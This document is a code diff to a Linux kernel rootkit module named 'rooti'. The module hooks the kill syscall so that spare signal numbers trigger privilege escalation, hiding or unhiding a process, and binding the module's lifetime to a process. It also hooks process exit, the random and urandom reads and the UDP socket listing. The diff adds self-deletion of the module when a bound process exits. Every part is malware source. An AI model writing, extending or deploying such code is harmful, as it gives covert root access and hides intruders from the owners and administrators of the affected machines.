@@ -31,10 +31,11 @@ MODULE_VERSION("1.0.0");
 
 // Unused signal numbers which can be used by the rootkit for its own purposes
 enum rooti_signal {
-    ROOTI_SIG_PROC_BIND = 61,   // request to bind to a proccess
-    ROOTI_SIG_PROC_UNHIDE = 62, // request to unhide a process
-    ROOTI_SIG_PROC_HIDE = 63,   // request to hide a process
-    ROOTI_SIG_PE = 64           // request for privilege escalation
+    ROOTI_SIG_PROC_LIFETIME_UNBIND = 60,  // request to unbind modules lifetime to the process
+    ROOTI_SIG_PROC_LIFETIME_BIND = 61,    // request to bind module lifetime to the process
+    ROOTI_SIG_PROC_UNHIDE = 62,           // request to unhide a process
+    ROOTI_SIG_PROC_HIDE = 63,             // request to hide a process
+    ROOTI_SIG_PROC_PE = 64                // request for privilege escalation
 };
 
 // List of tracked processes (for each one we track different attributes)
@@ -67,22 +68,24 @@ static ssize_t (*orig_random_read_iter)(struct kiocb *kiocb, struct iov_iter *it
 static ssize_t (*orig_urandom_read_iter)(struct kiocb *kiocb, struct iov_iter *iter);
 static void (*orig_do_exit)(long code);
 
-
 static asmlinkage long hook_kill(const struct pt_regs *regs)
 {
     int sig = regs->si;
 
     switch (sig)
     {
-    case ROOTI_SIG_PE:
+    case ROOTI_SIG_PROC_PE:
         return rooti_elevate_privilege();
     case ROOTI_SIG_PROC_HIDE:
         return rooti_track_proc_attr(current->pid, ROOTI_PROC_HIDDEN, &rooti_tracked_procs);
     case ROOTI_SIG_PROC_UNHIDE:
         rooti_untrack_proc_attr(current->pid, ROOTI_PROC_HIDDEN, &rooti_tracked_procs);
         return 0;
-    case ROOTI_SIG_PROC_BIND:
-        return rooti_track_proc_attr(current->pid, ROOTI_PROC_BOUND, &rooti_tracked_procs);
+    case ROOTI_SIG_PROC_LIFETIME_BIND:
+        return rooti_track_proc_attr(current->pid, ROOTI_PROC_LIFETIME_BOUND, &rooti_tracked_procs);
+    case ROOTI_SIG_PROC_LIFETIME_UNBIND:
+        rooti_untrack_proc_attr(current->pid, ROOTI_PROC_LIFETIME_BOUND, &rooti_tracked_procs);
+        return 0;
     default:
         return orig_kill(regs);
     }
@@ -262,10 +265,19 @@ static int hook_udp4_seq_show(struct seq_file *seq, void *v)
 static void hook_do_exit(long code)
 {
     struct rooti_tracked_proc *proc = rooti_search_tracked_proc(current->pid, &rooti_tracked_procs);
-    if (proc == NULL) orig_do_exit(code); 
+    bool should_unload = false;
 
+    if (proc == NULL) orig_do_exit(code);
+    
+    // If bound to the lifetime of the current process, the module should unload itself
+    if (test_bit(ROOTI_PROC_LIFETIME_BOUND, &proc->attrs)) {
+        should_unload = true;
+    }
     rooti_untrack_proc(proc);
-    ROOTI_DEBUG("the tracked process is now dead!");
+
+    if (should_unload) {
+        rooti_schedule_self_deletion();
+    }
     orig_do_exit(code);
 }
 
